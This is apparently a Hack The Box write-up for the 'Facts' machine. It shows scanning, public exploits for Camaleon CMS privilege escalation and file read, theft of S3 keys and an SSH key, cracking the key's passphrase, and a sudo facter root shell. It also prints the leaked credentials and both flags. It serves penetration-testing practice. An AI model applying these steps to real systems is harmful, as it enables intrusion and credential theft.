# Hack The Box: FACTS Write up

Facts is an easy box created for season 10 of HTB, the goal is to get to flags a user flag and a root flag

## write up
i was given this ip to accsess the box
```bash
10.129.7.217
```
a quick ping showed i was able to connect
```bash
└─$ ping 10.129.7.217         
PING 10.129.7.217 (10.129.7.217) 56(84) bytes of data.
64 bytes from 10.129.7.217: icmp_seq=1 ttl=63 time=147 ms
64 bytes from 10.129.7.217: icmp_seq=2 ttl=63 time=28.3 ms
```

running nmap showed the following ports open

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-15 12:04 +0000
Nmap scan report for 10.129.7.217
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
```

it was redirecting to http://facts.htb so i edited my /etc/hosts file and added it as a host

```bash
127.0.0.1       localhost
127.0.1.1       kali
10.129.7.217    facts.htb <-- added this to /etc/hosts
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

now that i can reach facts.htb opening it in my browser showed a basic web page:

![facts.htb webpage](https://files.catbox.moe/zpo25k.png)

the website is a fact site (as the name might suggest), it displays random facts and displays comments. searching around the / page didn't reveli anything all that intresting. I decided next to run a simple gobuster

```bash
└─$ gobuster dir -url facts.htb -wordlist /usr/share/wordlists/dirb/common.txt   
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.bashrc              (Status: 200) [Size: 11119]
.cvsignore           (Status: 200) [Size: 11128]
.history             (Status: 200) [Size: 11122]
.cvs                 (Status: 200) [Size: 11110]
.bash_history        (Status: 200) [Size: 11137]
.cache               (Status: 200) [Size: 11116]
.forward             (Status: 200) [Size: 11122]
.config              (Status: 200) [Size: 11119]
.hta                 (Status: 200) [Size: 11110]
.htaccess            (Status: 200) [Size: 11125]
.htpasswd            (Status: 200) [Size: 11125]
.listing             (Status: 200) [Size: 11122]
.listings            (Status: 200) [Size: 11125]
.mysql_history       (Status: 200) [Size: 11140]
.passwd              (Status: 200) [Size: 11119]
.perf                (Status: 200) [Size: 11113]
.rhosts              (Status: 200) [Size: 11119]
.profile             (Status: 200) [Size: 11122]
.sh_history          (Status: 200) [Size: 11131]
.ssh                 (Status: 200) [Size: 11110]
.subversion          (Status: 200) [Size: 11131]
.svn                 (Status: 200) [Size: 11110]
.swf                 (Status: 200) [Size: 11110]
.web                 (Status: 200) [Size: 11110]
400                  (Status: 200) [Size: 6685]
404                  (Status: 200) [Size: 4836]
500                  (Status: 200) [Size: 7918]
admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.cgi            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.pl             (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
ajax                 (Status: 200) [Size: 0]
cache                (Status: 200) [Size: 11116]
captcha              (Status: 200) [Size: 6483]
config               (Status: 200) [Size: 11119]
cvs                  (Status: 200) [Size: 11110]
CVS                  (Status: 200) [Size: 11110]
en                   (Status: 200) [Size: 11109]
error                (Status: 500) [Size: 7918]
forward              (Status: 200) [Size: 11122]
history              (Status: 200) [Size: 11122]
hta                  (Status: 200) [Size: 11110]
htpasswd             (Status: 200) [Size: 11125]
index                (Status: 200) [Size: 11113]
index.htm            (Status: 200) [Size: 11125]
Index                (Status: 200) [Size: 11113]
index.html           (Status: 200) [Size: 11128]
index.php            (Status: 200) [Size: 11125]
listing              (Status: 200) [Size: 11122]
listings             (Status: 200) [Size: 11125]
page                 (Status: 200) [Size: 19593]
passwd               (Status: 200) [Size: 11119]
perf                 (Status: 200) [Size: 11113]
post                 (Status: 200) [Size: 11308]
profile              (Status: 200) [Size: 11122]
robots.txt           (Status: 200) [Size: 99]
robots               (Status: 200) [Size: 33]
rss                  (Status: 200) [Size: 183]
search               (Status: 200) [Size: 19187]
sitemap.gz           (Status: 500) [Size: 7918]
sitemap.xml          (Status: 200) [Size: 3508]
sitemap              (Status: 200) [Size: 3508]
ssh                  (Status: 200) [Size: 11110]
svn                  (Status: 200) [Size: 11110]
swf                  (Status: 200) [Size: 11110]
up                   (Status: 200) [Size: 73]
web                  (Status: 200) [Size: 11110]
welcome              (Status: 200) [Size: 11966]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

I did have a look through most of these pages but they either redirected to the home page or require the user to be authnticated to acsess. so I turned my attention to the admin login page

![facts.htb admin login](https://files.catbox.moe/7gri2f.png)

I tried some username/password i could think of. admin:admin, admin:changeme etc but was not lucky. I was able however to create my own account

![facts.htb admin create user](https://files.catbox.moe/twcw5y.png).

using my user I was able to get to an empty admin panel

![facts.htb admin create user](https://files.catbox.moe/plfwxd.png)

looking around the admin panel their was nothing useful, i however was able to get a name and version number for this admin panel.

```
camaleon CMS - 2.9.0
```

doing some research, I found this version of camaleon CMS is vulnerable (CVE-2025-2304) to privilge esculation. the gist of vulnerablity is that when as user whishes to change their password ot calls 'update_ajax' function in the UserController script. this function uses a dangerous method 'permit!' which allows a user to add extra  parameters in the request without any filtering. so not only can you change your password you can change your role as well, such as from client to admin.

I found an exploit on github prewritten (https://github.com/Alien0ne/CVE-2025-2304?tab=readme-ov-file)

with this exploit not only was i able to get admin, i was also able to get their s3 bucket secrets:

```bash
└─$ python3 exploit.py -u http://facts.htb -U b -P b -e
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 6
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 6
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA43626A3FA1E7F066
   s3 secret key: JkBlR6FlwYEPiAndsXnZExUZjsYBOu2c3BAJYabp
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
```

I configured my s3 settings with these accsess keys and tried to list what was in the bucket

inside i found 2 directories:

```bash
└─$ aws --endpoint http://facts.htb:54321 s3 ls
2025-09-11 13:06:52 internal
2025-09-11 13:06:52 randomfacts
```

inside the internal directory i was able to find a private ssh key:

```bash
└─$ aws --endpoint http://facts.htb:54321 s3 ls s3://internal      
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 18:45:13        220 .bash_logout
2026-01-08 18:45:13       3900 .bashrc
2026-01-08 18:47:17         20 .lesshst
2026-01-08 18:47:17        807 .profile
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/writeup/facts/CVE-2025-2304]
└─$ aws --endpoint http://facts.htb:54321 s3 ls s3://internal/.ssh/
2026-03-15 12:00:21         82 authorized_keys
2026-03-15 12:00:21        464 id_ed25519
                                                                                                            

```

I downloaded the key and left the bucket
``` bash
└─$ aws --endpoint http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519           
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/writeup/facts/CVE-2025-2304]
└─$ ls
exploit.py  id_ed25519  README.md
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/writeup/facts/CVE-2025-2304]
└─$ cat id_ed25519  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAl9i4F0/
oyQa6tzIqMFH7ZAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIHOeK0fGhsRp6i7d
kCpHjwSzGgVRU4IAr4pL6iQGFY1oAAAAoHBhDA2KlyhtIrr4MGgtS0bcP5x6ZlLFQyqWD9
S0T3OV7w8sutZdgNnqGjiucXMDmIqNqNVqeiavOFLO5xlxfKuk3Z6qBl053gnz6R0K/JBT
LBdweX1NTZBWU/U4ePUt3HrVFWB8MCCCi/giBFj8kgD7ecV5zAD6hbue/0M9TEeiv97LWL
rfB2RJqDvBJ9i7+dOWAUzDukIj6fylKNbDiqE=
-----END OPENSSH PRIVATE KEY-----
```

using the john the ripper i was able to bruteforce the private key with the rockyou wordlist

```bash
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/writeup/facts/CVE-2025-2304]
└─$ ssh2john id_ed25519 > privkey
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/writeup/facts/CVE-2025-2304]
└─$ cat privkey   
id_ed25519:$sshng$6$16$25f62e05d3fa3241aeadcc8a8c147ed9$290$6f70656e7373682d6b65792d7631000000000a6165733235362d63747200000006626372797074000000180000001025f62e05d3fa3241aeadcc8a8c147ed90000001800000001000000330000000b7373682d6564323535313900000020739e2b47c686c469ea2edd902a478f04b31a0551538200af8a4bea2406158d68000000a070610c0d8a97286d22baf830682d4b46dc3f9c7a6652c5432a960fd4b44f7395ef0f2cbad65d80d9ea1a38ae717303988a8da8d56a7a26af3852cee719717caba4dd9eaa065d39de09f3e91d0afc90532c1770797d4d4d905653f53878f52ddc7ad515607c3020828bf8220458fc9200fb79c579cc00fa85bb9eff433d4c47a2bfdecb58badf076449a83bc127d8bbf9d396014cc3ba4223e9fca528d6c38aa1$24$130
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/writeup/facts/CVE-2025-2304]
└─$ john privkey --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:58 0.01% (ETA: 2026-03-21 12:50) 0g/s 33.46p/s 33.46c/s 33.46C/s yousuck..fuckit
0g 0:00:00:59 0.01% (ETA: 2026-03-21 12:26) 0g/s 33.44p/s 33.44c/s 33.44C/s blessed1..paris
dragonballz      (id_ed25519)     
1g 0:00:01:35 DONE (2026-03-15 12:58) 0.01052g/s 33.68p/s 33.68c/s 33.68C/s 123456m..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

the password for the private key:
```bash
dragonballz      (id_ed25519)
```

so great now we have a password all we need now is a user for this private key. this i was stuck on for a while, doing more reascher i eventually found not only was it vulnerable to privilge esculation it also has is arbitary file read (CVE-2024–46987)

looking around I found another exsploit written (https://github.com/Goultarde/CVE-2024-46987)
using this i was able to read the passwd file

``` bash
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l b -p test /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

this displays all the users on the server, only two users stood out both with UID >= 1000 and /bin/bash as shells

these being
```
trivia
william
```

using my keys with both of these users i was able to log on to the box with the 'trivia' users

```bash
┌──(kali㉿kali)-[~/Documents/writeup/facts]
└─$ ssh -i id_ed25519 trivia@facts.htb                                    
Enter passphrase for key 'id_ed25519': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Mar 15 01:19:35 PM UTC 2026

  System load:           0.03
  Usage of /:            72.1% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.7.217
  IPv6 address for eth0: dead:beef::250:56ff:fe94:71f5


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ 
```

now we are on the box, i ran sudo -l to see if we can run anything with root privilge. luckily we can

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

we can use facter and with no password!

Facter is a system profiling tool written in Ruby. It is most commonly used by the configuration management tool Puppet.

Its job is to collect system information (“facts”) about a machine, such as:

- OS version
- hostname
- IP addresses
- CPU information
- memory
- disks
- uptime
- etc

When Puppet runs, it uses these facts to decide how to configure a system. the reason it is dangerous is because you are able to write custom facts. so as facter is able to be run with root privilge if we write a custom fact that calls a root shell it will happily gives us a root shell

so i wrote a very simple ruby script
```rb
exec "/bin/sh"
```

and stored this in the /tmp directory as you are able to read/write to this folder as anyone

``` bash
trivia@facts:~$ cd ../../tmp/
trivia@facts:/tmp$ echo 'exec "/bin/sh"' > exploit.rb
trivia@facts:/tmp$ ls
exploit.rb
snap-private-tmp
systemd-private-8eb234643d534c898b165f4eca29ca10-fwupd.service-04111W
systemd-private-8eb234643d534c898b165f4eca29ca10-ModemManager.service-IvJA4C
systemd-private-8eb234643d534c898b165f4eca29ca10-polkit.service-qz81Ay
systemd-private-8eb234643d534c898b165f4eca29ca10-systemd-logind.service-sFjUhL
systemd-private-8eb234643d534c898b165f4eca29ca10-upower.service-s7xJpE
vmware-root_988-2991203012
trivia@facts:/tmp$ 
```

now all we need to do is simply call this script with facter with sudo

``` bash

trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir /tmp exploit.rb
# whoami
root
# 
```

we now have root accsess, we can now get the flags for this box
```bash
root.txt: 83248c8389b9cda4cb9f8cd2d88a4113
user.txt: f74d64d1264fd999b0665cb33a839ebc
```


